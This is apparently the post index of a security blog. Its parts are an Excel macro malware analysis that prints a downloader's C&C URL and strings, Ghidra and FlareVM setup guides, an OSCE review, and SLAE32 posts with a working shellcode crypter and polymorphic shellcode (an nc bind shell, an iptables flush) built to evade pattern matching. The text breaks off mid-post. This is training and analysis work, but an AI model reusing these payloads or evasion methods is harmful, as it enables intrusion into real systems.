://componen$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component.$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component.p$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/w$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-i$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-in$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-ind$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-inde$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-index$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-index.$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-index.p$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-index.ph$EY$36257EsNDtISBBnaCXk=https ://component[.]pw/wp-index.phpFinal: EsNDtISBBnaCXk=https ://component[.]pw/wp-index.phpAt the end, a dump of the final text strings are listed. This is where you can find IoC’s, Win32 calls, paths to executables that may be dropped, the C&amp;amp;C path that we see here (and I verified it calls out to with FakeNet running).Final strings list:===========================================EsNDtISBBnaCXk=C:\\jhmKRYCygxjnNCysLIfB=(var-cell)=&quot;=RETURN(FORMULA.FILL(EsNDtISBBnaCXk)=RUN(EsNDtISBBnaCXk=C:\\jhmKRYC\\POeikcCEsNDtISBBnaCXk=cmhKasNgygxjnNCysLIfB=(var-cell)=&quot;=RETURN(FORMULA.FILL(EsNDtISBBnaCXk)=RUN(EsNDtISBBnaCXk=dTyIIHMwEsNDtISBBnaCXk=CreateDirectoryAEsNDtISBBnaCXk=Shell32=RUN(EsNDtISBBnaCXk=ShellExecuteAEsNDtISBBnaCXk=C:\\jhmKRYC\\POeikcCEsNDtISBBnaCXk=DownloadFile=RUN(EsNDtISBBnaCXk=C:\\jhmKRYC\\POeikcC\\XqwFtZi.exe... and moreConclusionThis was an exercise to see how much I could learn from this formula code through static analysis. Many of the findings from above were observed during dynamic analysis but not all. The more information you have before dynamic analysis the more you can knowingly watch out for and attempt to observe. The downside of dynamic analysis is that you only see the path the malware takes during that detonation and you may miss a lot of what the malware could potentially do.Full code to above project is in the https://github.com/tdmathison/ExcelFormulaExtractor repo." }, { "title": "Ghidra error: Unable to locate the DIA SDK", "url": "/posts/Ghidra-DIA-SDK-PDB-Error/", "categories": "Blogging, Malware-Analysis", "tags": "ghidra", "date": "2020-09-27 11:08:00 -0700", "snippet": "Ghidra error on auto-analysisIn my flarevm using Windows 10 I have Visual Studio 2019 Community edition installed for building C/C++ programs as needed. When performing the initial auto-analysis on a binary you may run into the following error message relating to the DIA SDK and loading PDB files.This is simply relating to a DIA SDK DLL not being registered that is part of the Visual Studio install (why it does not get registered during the install I don’t know). The Ghidra docs state that there is a bundled pdb.exe that gets used on Windows and this is a pre-requisite that requires some manual intervention.The error dialog boxThe fixIn the case of Visual Studio 2019 installed, the file to register is at the following location (the exact location of this file may different based on Visual Studio version installed):C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\DIA SDK\\bin\\amd64\\msdia140.dllTo register it, run the following command from elevated command prompt:regsvr32 “C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\DIA SDK\\bin\\amd64\\msdia140.dll”Restart Ghidra and the auto-analysis should function as expected." }, { "title": "Getting Started with Ghidra and FlareVM", "url": "/posts/Getting-started-FlareVM-Ghidra/", "categories": "Blogging, Malware-Analysis", "tags": "flarevm, ghidra", "date": "2020-09-21 15:35:00 -0700", "snippet": "GoalThis is a quick guide to get you started on installing FlareVM by FireEye and setting up Ghidra for reverse engineering malware. The FlareVM installation is a script you can run that will turn a Windows 10 installation into a reverse engineering environment that has all the tools needed for binary analysis, RE, and a safe place to detonate malicious software.The flagship RE tool in the industry is HexRays IDA Pro and while an IDA Free version is available it has quite a few limitations. Ghidra has been released as OpenSource by the NSA and parallels many features of IDA Pro and can augment IDA Free in a good way.FireEye FlareVMTo begin, you should have either Oracle VirtualBox https://www.virtualbox.org or VMware Workstation/Fusion https://www.vmware.com/products/workstation-pro.html installed on the host machine you are going to perform analysis from.Post-Windows 10 install stepsThe FlareVM script attempts to take some steps to prepare the Windows 10 installation to turn off AV services that will interfere with what the VM is being built out for. However, I have experienced many issues with this failing to work properly and have found taking the following steps manually to make everything work properly.Disable Windows Defender (Windows 7 &amp;amp; 10) Start gpedit.msc Computer Configuration &amp;gt; Administrative Templates &amp;gt; Windows Components &amp;gt; Windows Defender Enable “Turn off Windows Defender” Click “Apply”, “OK” Restart Windows Disable update Auto-restarts Start gpedit.msc Computer Configuration &amp;gt; Administrative Templates &amp;gt; Windows Components &amp;gt; Windows Update Enable “No auto-restart with logged…” Click “Apply”, “OK” Take a snapshot of your Windows 10 machine in case the FlareVM install goes bad.Installing FlareVM onto the Windows machine Clone the GitHub FlareVM repository to your Windows 10 VM machine. The repository is located at https://github.com/fireeye/flare-vm. To kick off the installation process read the steps detailed in https://github.com/fireeye/flare-vm/blob/master/README.md which contain only a few actions: Open PowerShell as Admin and run “Set-ExecutionPolicy Unrestricted” Run ./install.ps1. NOTE: This process uses the package manager tool Chocolatey https://chocolatey.org and custom FireEye built packages to completely transform the machine into a VM that you can perform all your RE tasks from. This install process can take many hours to complete so plan to allocate some time for this to finish.When the install of FlareVM completes make sure you take another snapshot.NSA’s GhidraThe official site for the Ghidra RE tool is at https://ghidra-sre.org and can be downloaded and ran on its own, from any platform. I typically use this within the Windows FlareVM but also have this installed on my Kali Linux VM for reversing GNU/Linux based malware.At this point you will have Ghidra installed already on your machine and there should be a link to Ghidra on your desktop. If not, hit the Windows key and do a search for Ghidra and it should pop up in the results.There are some post-FlareVM actions I take in regard to Ghidra that are optional, but recommended to get the most out of Ghidra. I have broken this into three parts: Gaining some FLIRT signatures capability that IDA Pro has Getting a debugger to work with ghidra Additional Ghidra scripts that help in the RE ProcessGaining some FLIRT signatures capability that IDA Pro hasTo understand what F.L.I.R.T. signatures are and why they are important please read the HexRays IDA Pro article on this topic: IDA F.L.I.R.T. Technology: In-Depthhttps://www.hex-rays.com/products/ida/tech/flirt/in_depth/To gain some of this capability we can install a script that allows for importing and applying the signatures: Ghidra Plugin Script to apply signature files https://github.com/NWMonster/ApplySig Two FLIRT Signature databases that you should clone to your FlareVM for use by this are: https://github.com/push0ebp/sig-database https://github.com/Maktm/FLIRTDB Getting a debugger to work with GhidraA missing capability in Ghidra that IDA Pro has is an integrated debugger. This is a feature that is planned to make its way into Ghidra but until it does we can use the following plugin to gain the ability to sync to an external debugger. The debugger that I integrate with is x64dbg and the instructions with additional steps to complete the integration are on the ret-sync GitHub page. https://github.com/bootleg/ret-syncAdditional Ghidra scripts that help in the RE ProcessThe following is a list of additional scripts I use that aid in enhancing the use of Ghidra: https://github.com/reb311ion/replica Script to rename functions and types based on findings of its scan https://github.com/d3v1l401/FindCrypt-Ghidra Find cryptography functions https://github.com/ghidraninja/ghidra_scripts Useful Ghidra scripts (namely for Yara and binwalk) https://github.com/0xb0bb/pwndra A collection of pwn/CTF related utilities https://github.com/astrelsky/Ghidra-Cpp-Class-Analyzer The script used to import the output of OOAnalyzer for C++ code Article: https://insights.sei.cmu.edu/sei_blog/2019/07/using-ooanalyzer-to-reverse-engineer-object-oriented-code-with-ghidra.html Some Ghidra Settings changes that can be adjusted from the CodeBrowser tool once a project is created: Edit-&amp;gt;Tool Options ByteViewer Highlight Cursor Line Color -&amp;gt; Yellow (or some other more visible color) Listing Fields-&amp;gt;Address Field Show Block Name = Checked Listing Fields-&amp;gt;Bytes Field Maximum Lines To Display = 1 Listing Fields-&amp;gt;Cursor Text Highlight Mouse Button To Activate = LEFT Listing Fields-&amp;gt;EOL Comments Field Show Semicolon at Start of Each Line = Checked Listing Fields-&amp;gt;Operands Field Add Space After Separator = Checked Lastly, to make going between Ghidra and IDA Pro a little easier, I have updated the keymappings of Ghidra to be more similar to IDA Pro (many of these mapping just make more sense anyways (like using ESC to move backward and using the key ‘x’ to search for “references to”)). https://github.com/JeremyBlackthorne/Ghidra-KeybindingsThis completes the basic setup of the FlareVM that can now be used for RE and malware detonation purposes." }, { "title": "OSCE Review", "url": "/posts/osce-review/", "categories": "Blogging, Offensive-Security", "tags": "offensive-security, osce, penetration-testing, hacking", "date": "2018-02-22 11:00:00 -0800", "snippet": "General thoughtsWith past experience with Offensive Security, the training format was familiar which sped things up a bit for consuming the content. The Offensive Security Certified Expert (OSCE) course is similar in that regard but very different in terms of content. The biggest difference is in how focused one is over the other.The OSCE is primarily focused on exploit development with a little bit of web application and networking discussion in regards to common issues. The buffer overflow exercise from the OSCP is about 80% the type of work done in the OSCE but just taken farther. That was the most enjoyable part of the OSCP for me and as expected the OSCE experience overall was more enjoyable for me as well.The OSCE LabThe course for this certification is called “Cracking The Perimeter” and the sign up for the course has a small gated check to complete the registration. This is really in the form of just checking if you can identify shellcode and use the GDB debugger; pretty trivial to get past. If this poses any problems then looking into the SecurityTube Assembly Expert would be very helpful.The lab contains the instructional videos and PDF that covers the course content. It splits things up into five areas: Web application issues, backdooring executables, ASLR and egghunters, fuzzing with Spike for zero days, and finally attacking the networking infrastructure.Unlike the OSCP, there are only a couple machines available to you as all the exploit development will be done on your Kali, Vista, or Windows Server box and all the applications you deal with will reside on one of them (the course uses the old BackTrack distro but I had no issues using the current Kali image).Most modules you go through will be consumable without too much issue with module 8 being the most difficult and probably where you’ll spend most of your time due to learning about creating exploits where there are tight restrictions as to what will work for a successful exploit.I spent probably about a week to get through all the content the first time. I then repeated it several times and automated some of it with python to help understand the material. I also spent a decent amount of time on external sites teaching related material to help understand it even better.The OSCE ExamThe exam is a 48 hour block of time given to complete the requirements. The objectives line up somewhat close to the course content but not entirely. For certain areas in exploit development I ended up learning more during the exam than I did going through the course content (and I went through that content 3-4 times over).In hindsight, to succeed in the more difficult parts of the exam you’ll need to do research and learn a bit more in each area than what is directly in the course. Thinking a bit out of the box and not getting stuck on just what is shown in the lab content helps too.On my first attempt and completed everything except one little thing (on the harder machine) that led to not passing. I knew what I needed to do but just couldn’t get it to work. A day after the exam I figured out what I was trying to do and rescheduled less than a week out and passed it.Final ThoughtsThis was the most enjoyable course I’ve taken with Offensive Security due to the subject matter lining up with my core interests. The course gives you a guideline of content to learn and then its up to you to do additional research in each area. If exploit development is of interest to you and you haven’t done much of it yet this gives a good foundation to start learning more current content.Prior to this course I tried to learn and understand present day exploit topics and much of it was foreign and hard to understand (from a hands-on practical stance); after this course it all seems more “common sense” now and I’m picking it up much quicker. In that sense, this may be one of the better ways to jump start your exploit research or reversing career." }, { "title": "SLAE32: Creating custom crypter shellcode", "url": "/posts/slae32-7/", "categories": "SLAE32", "tags": "assembly, x86, penetration-testing, hacking, exploit-development, shellcode, slae32", "date": "2018-01-22 11:00:00 -0800", "snippet": "The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-990Assignment #7Description Create a custom crypter like the one shown in the “crypters” video Free to use any existing encryption schema Can use any programming languageChoosing a symmetric encryption algorithmFor the encryption and decryption of the shellcode I have chosen to use the Corrected Block TEA (XXTEA) block cipher. Further reading on this implementation can be found here =&amp;gt; XXTEA.One round of XXTEA (Source)As to not reimplement XXTEA itself I discovered a C implementation of the cipher on github at XXTEA encryption arithmetic library. This implementation will allow me to encrypt the shellcode and emmit it in shellcode form.Shellcode to encryptI will be using some shellcode from earlier to spawn a simple /bin/sh. The assembly to spawn this shell is:global _start section .text_start: ; PUSH the first null dword xor eax, eax push eax ; PUSH //bin/sh (8 bytes) push 0x68732f2f push 0x6e69622f mov ebx, esp push eax mov edx, esp push ebx mov ecx, esp mov al, 11 int 0x80The generated shellcode from objdump that we will encrypt is:[sengen@manjaro-x86 assignment7]$ objdump -d ./execve-stack|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&quot;/&#39;|sed &#39;s/$/&quot;/g&#39;&quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;Encrypting shellcodeFor the encryption we will take the shellcode we generated above and hardcode it into our encrypt.c source code. Utilizing the XXTEA algorithm we’ll encrypt each byte and output it in shellcode format.encrypt.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &quot;xxtea.h&quot;int main(int argc, char* argv[]) { if (argc != 2) { printf(&quot;%s\\n&quot;, &quot;usage: ./encrypt &amp;lt;key&amp;gt;&quot;); exit(1); } unsigned char shellcode[] = &quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;; size_t shellcode_len = strlen((const char *) shellcode); const char *key = argv[1]; printf(&quot;%s\\n&quot;, &quot;Shellcode before encryption:&quot;); for (int counter = 0; counter &amp;lt; shellcode_len; ++counter) { printf(&quot;\\\\x%02x&quot;, shellcode[counter]); } size_t len; unsigned char *encrypt_data = xxtea_encrypt(shellcode, strlen(shellcode), key, &amp;amp;len); printf(&quot;\\n\\nEncrypted shellcode:\\n&quot;); for (size_t counter = 0; counter &amp;lt; strlen(encrypt_data); counter += 2) { printf(&quot;\\\\x%02x\\\\x%02x&quot;, (int)encrypt_data[counter], (int)encrypt_data[counter+1]); } printf(&quot;\\n&quot;); return 0;}Compiling and running the encrypt.c program[sengen@manjaro-x86 assignment7]$ gcc -Wall encrypt.c xxtea.c xxtea.h -o encrypt[sengen@manjaro-x86 assignment7]$ ./encrypt slae32-assembly-expertShellcode before encryption:\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80Encrypted shellcode:\\x5b\\x69\\x1c\\xed\\x22\\x51\\x2c\\xcc\\x53\\x92\\x18\\xa4\\xed\\x12\\x31\\xb2\\x86\\xe0\\x05\\xfe\\x96\\xd5\\x71\\xd5\\x7e\\x5b\\xd6\\x10\\x2f\\xe9\\xf5\\x9eDecrypting shellcodeNow we have an encrypted version of the shellcode. We’ll copy this out and place it into our decrypt.c program. This does the opposite and performs the decryptions of each byte and again we’ll print it to the screen. Additionally, we’ll now execute the shellcode which will spawn our /bin/sh.#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &quot;xxtea.h&quot;int main(int argc, char* argv[]) { if (argc != 2) { printf(&quot;%s\\n&quot;, &quot;usage: ./decrypt &amp;lt;key&amp;gt;&quot;); exit(1); } unsigned char encrypted_data[] = &quot;\\x5b\\x69\\x1c\\xed\\x22\\x51\\x2c\\xcc\\x53\\x92\\x18\\xa4\\xed\\x12\\x31\\xb2\\x86\\xe0\\x05\\xfe\\x96\\xd5\\x71\\xd5\\x7e\\x5b\\xd6\\x10\\x2f\\xe9\\xf5\\x9e&quot;; size_t encrypted_data_len = strlen((const char *) encrypted_data); const char *key = argv[1]; printf(&quot;%s\\n&quot;, &quot;Shellcode before decryption:&quot;); for (int counter = 0; counter &amp;lt; encrypted_data_len; ++counter) { printf(&quot;\\\\x%02x&quot;, encrypted_data[counter]); } size_t len; unsigned char *decrypted_data = xxtea_decrypt(encrypted_data, encrypted_data_len, key, &amp;amp;len); printf(&quot;\\n\\nDecrypted shellcode:\\n&quot;); for (size_t counter = 0; counter &amp;lt; strlen(decrypted_data); counter += 2) { printf(&quot;\\\\x%02x\\\\x%02x&quot;, (int)decrypted_data[counter], (int)decrypted_data[counter+1]); } printf(&quot;\\n\\nExecuting shellcode.&quot;); int (*ret)() = (int(*)())decrypted_data; ret(); return 0;}Compiling and running the decrypt.c program[sengen@manjaro-x86 assignment7]$ gcc -Wall decrypt.c xxtea.c xxtea.h -o decrypt[sengen@manjaro-x86 assignment7]$ ./decrypt slae32-assembly-expertShellcode before decryption:\\x5b\\x69\\x1c\\xed\\x22\\x51\\x2c\\xcc\\x53\\x92\\x18\\xa4\\xed\\x12\\x31\\xb2\\x86\\xe0\\x05\\xfe\\x96\\xd5\\x71\\xd5\\x7e\\x5b\\xd6\\x10\\x2f\\xe9\\xf5\\x9eDecrypted shellcode:\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x00sh-4.4$Source codeAll source code for this assignment can be found at https://github.com/tdmathison/SLAE32/tree/master/assignment7." }, { "title": "SLAE32: Creating polymorphic versions of existing shellcode", "url": "/posts/slae32-6/", "categories": "SLAE32", "tags": "assembly, x86, penetration-testing, hacking, exploit-development, shellcode, slae32", "date": "2018-01-21 11:00:00 -0800", "snippet": "The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-990Assignment #6Description Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching The polymorphic versions cannot be larger than 150% of the existing shellcode Bonus points for making it shorter in length than originalShellcode 1: shellcode-804.phpLocation: http://shell-storm.org/shellcode/files/shellcode-804.phpWhat it doesIf we run the shellcode with strace we can see the command it ends up executing. In the case of this executable it runs “/bin//////nc -lvve/bin/sh -vp13377”. All of the text for these commands are pushed onto the stack and the registers are loaded up with pointers to the stack with their locations.[sengen@manjaro-x86 assignment6]$ strace -e execve ./shellcode-804execve(&quot;./shellcode-804&quot;, [&quot;./shellcode-804&quot;], 0xbfa21108 /* 55 vars */) = 0execve(&quot;/bin//////nc&quot;, [&quot;/bin//////nc&quot;, &quot;-lvve/bin/sh&quot;, &quot;-vp13377\\1&quot;], NULL) = 0Ncat: Version 7.60 ( https://nmap.org/ncat )Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.Ncat: SHA-1 fingerprint: CB02 CE67 7AE9 8A2B 64F0 6EA5 82B2 DE8B 869D 365CNCAT DEBUG: Initialized fdlist with 103 maxfdsNcat: Listening on :::13377NCAT DEBUG: Added fd 3 to list, nfds 1, maxfd 3Ncat: Listening on 0.0.0.0:13377NCAT DEBUG: Added fd 4 to list, nfds 2, maxfd 4NCAT DEBUG: Added fd 0 to list, nfds 3, maxfd 4NCAT DEBUG: Initialized fdlist with 100 maxfdsNCAT DEBUG: selecting, fdmax 4The original shellcodeThe starting shellcode is pretty straight forward and pushes the exactly text for the command onto the stack for execve to execute. The original size of this shellcode is 64 bytes (150% would be 96 bytes).08048080 &amp;lt;_start&amp;gt;: 8048080: 31 c0 xor eax,eax 8048082: 31 d2 xor edx,edx 8048084: 68 33 33 37 37 push 0x37373333 ; &quot;7733&quot; 8048089: 68 2d 76 70 31 push 0x3170762d ; &quot;1pv-&quot; 804808e: 89 e2 mov edx,esp 8048090: 50 push eax 8048091: 68 6e 2f 73 68 push 0x68732f6e ; &quot;hs/n&quot; 8048096: 68 65 2f 62 69 push 0x69622f65 ; &quot;ib/e&quot; 804809b: 68 2d 6c 76 76 push 0x76766c2d ; &quot;vvl-&quot; 80480a0: 89 e1 mov ecx,esp 80480a2: 50 push eax 80480a3: 68 2f 2f 6e 63 push 0x636e2f2f ; &quot;cn//&quot; 80480a8: 68 2f 2f 2f 2f push 0x2f2f2f2f ; &quot;////&quot; 80480ad: 68 2f 62 69 6e push 0x6e69622f ; &quot;nib/&quot; 80480b2: 89 e3 mov ebx,esp 80480b4: 50 push eax 80480b5: 52 push edx 80480b6: 51 push ecx 80480b7: 53 push ebx 80480b8: 31 d2 xor edx,edx 80480ba: 89 e1 mov ecx,esp 80480bc: b0 0b mov al,0xb 80480be: cd 80 int 0x80The changesTo change the instructions around a bit so the opcodes become quite different from the original I’ve changed the hex that is being pushed to the stack by first calculating offline what add dword [esp],0x11111111 to each dword would be. The resulting dwords are what are placed in the assembly and pushed to the stack. Additionally, the null bytes between each string are now 0x11111111.Once this is in place I let the stack build up with the mangled values right up to the point of where the execve would be called. The stack now looks like the following:gdb$ x/14wx $esp0xbffff0c8: 0xbffff0d8 0xbffff0e8 0xbffff0f8 0x111111110xbffff0d8: 0x7f7a7340 0x40404040 0x747f4040 0x111111110xbffff0e8: 0x87877d3e 0x7a734076 0x7984407f 0x111111110xbffff0f8: 0x4281873e 0x48484444The first three dwords are pointers to the stack where the strings are located so we don’t want to touch those. However, the 4th to 14th consecutive dword in the stack need to have sub dword [esp],0x11111111 applied to it.I use the following loop to accomplish this:sub_loop: sub dword [esp+8+ecx*4],0x11111111 dec cx jnz sub_loopThe stack now looks like:gdb$ x/14wx $esp0xbffff0c8: 0xbffff0d8 0xbffff0e8 0xbffff0f8 0x000000000xbffff0d8: 0x6e69622f 0x2f2f2f2f 0x636e2f2f 0x000000000xbffff0e8: 0x76766c2d 0x69622f65 0x68732f6e 0x000000000xbffff0f8: 0x3170762d 0x37373333This modified shellcode resulted in 86 bytes which is around 134% of the original.08048080 &amp;lt;_start&amp;gt;: 8048080: 31 c0 xor eax,eax 8048082: b8 11 11 11 11 mov eax,0x11111111 8048087: 31 d2 xor edx,edx 8048089: 68 44 44 48 48 push 0x48484444 ; &quot;HHDD&quot; 804808e: 68 3e 87 81 42 push 0x4281873e ; &quot;B&amp;gt;&quot; 8048093: 89 e2 mov edx,esp 8048095: 50 push eax 8048096: 68 7f 40 84 79 push 0x7984407f ; &quot;y@&quot; 804809b: 68 76 40 73 7a push 0x7a734076 ; &quot;zs@v&quot; 80480a0: 68 3e 7d 87 87 push 0x87877d3e ; &quot;}&amp;gt;&quot; 80480a5: 89 e1 mov ecx,esp 80480a7: 50 push eax 80480a8: 68 40 40 7f 74 push 0x747f4040 ; &quot;t@@&quot; 80480ad: 68 40 40 40 40 push 0x40404040 ; &quot;@@@@&quot; 80480b2: 68 40 73 7a 7f push 0x7f7a7340 ; &quot;zs@&quot; 80480b7: 89 e3 mov ebx,esp 80480b9: 50 push eax 80480ba: 52 push edx 80480bb: 51 push ecx 80480bc: 53 push ebx 80480bd: 31 d2 xor edx,edx 80480bf: b0 0b mov al,0xb 80480c1: 31 c9 xor ecx,ecx 80480c3: b1 0b mov cl,0xb 80480c5: 89 c8 mov eax,ecx080480c7 &amp;lt;sub_loop&amp;gt;: 80480c7: 81 6c 8c 08 11 11 11 sub DWORD PTR [esp+ecx*4+0x8],0x11111111 80480ce: 11 80480cf: 66 49 dec cx 80480d1: 75 f4 jne 80480c7 &amp;lt;sub_loop&amp;gt; 80480d3: 89 e1 mov ecx,esp 80480d5: cd 80 int 0x80Shellcode 2: shellcode-65.phpLocation: http://shell-storm.org/shellcode/files/shellcode-65.phpWhat it doesThis shellcode flushes all rules using ipchains. Note: I have made a slight modification to the original shellcode in which it will use iptables instead of ipchains.The original shellcodeThe size of the shellcode is 40 bytes.08048080 &amp;lt;_start&amp;gt;:8048080: 6a 0b push 0xb ;8048082: 58 pop eax ; eax = 11 (execve)8048083: 99 cdq ; edx = 0 (eax extend)8048084: 52 push edx ; push null byte to stack8048085: 66 68 2d 46 pushw 0x462d ; &quot;F-&quot;8048089: 89 e1 mov ecx,esp ; ecx = pointer to &quot;-F&quot;804808b: 52 push edx ; push null byte to stack804808c: 66 68 65 73 pushw 0x7365 ; &quot;se&quot;8048090: 68 74 61 62 6c push 0x6c626174 ; &quot;lbat&quot;8048095: 68 6e 2f 69 70 push 0x70692f6e ; &quot;pi/n&quot;804809a: 68 2f 73 62 69 push 0x6962732f ; &quot;ibs/&quot;804809f: 89 e3 mov ebx,esp ; ebx = /sbin/iptables80480a1: 52 push edx ; push edx (\\0)80480a2: 51 push ecx ; push ecx (-F)80480a3: 53 push ebx ; push ebx (/sbin/iptables)80480a4: 89 e1 mov ecx,esp ; ecx = pointer to stack80480a6: cd 80 int 0x80 ; execveThe changesIn this example the changes are made by doing three things different: Changing registers used, changing order in which strings are pushed to the stack, and changing the program path by adding in some slashes.Changing registersEDX is no longer used in the new shellcode and instead EAX is used to push null bytes. At the very end we re-use this register to indirectly push 11 into it.xor eax,eax...mov ax,0xainc axChanging order of pushesThe original shellcode pushed in the expected order of “-F” then “/sbin/iptables”. In the new version this is flipped but of course, in the end we still must push the pointers to the strings in the proper order and that cannot change.Changing program pathFinally, we change the program path from “/sbin/iptables” to “//sbin//iptables”. We can add as many slashes as we want and this has no effect on things executing properly. Performing this small action changes the opcodes.Before:66 68 65 73 pushw 0x736568 74 61 62 6c push 0x6c62617468 6e 2f 69 70 push 0x70692f6e68 2f 73 62 69 push 0x6962732fAfter:68 62 6c 65 73 push 0x73656c6268 69 70 74 61 push 0x6174706968 69 6e 2f 2f push 0x2f2f6e6968 2f 2f 73 62 push 0x62732f2fThe final shellcode is just slightly larger than the original and sits at 45 bytes (about a 107% of the original).08048080 &amp;lt;_start&amp;gt;:8048080: 31 c0 xor eax,eax8048082: 50 push eax8048083: 68 62 6c 65 73 push 0x73656c628048088: 68 69 70 74 61 push 0x61747069804808d: 68 69 6e 2f 2f push 0x2f2f6e698048092: 68 2f 2f 73 62 push 0x62732f2f8048097: 89 e3 mov ebx,esp8048099: 50 push eax804809a: 66 68 2d 46 pushw 0x462d804809e: 89 e1 mov ecx,esp80480a0: 50 push eax80480a1: 51 push ecx80480a2: 53 push ebx80480a3: 89 e1 mov ecx,esp80480a5: b0 0a mov al,0xa80480a9: 66 40 inc ax80480ab: cd 80 int 0x80Shellcode 3: shellcode-893.phpLocation: http://shell-storm.org/shellcode/files/shellcode-893.phpWhat it doesThis shellcode will add a new entry into the /etc/hosts file for “127.1.1.1 google.com”.The original shellcodeThe shellcode takes up 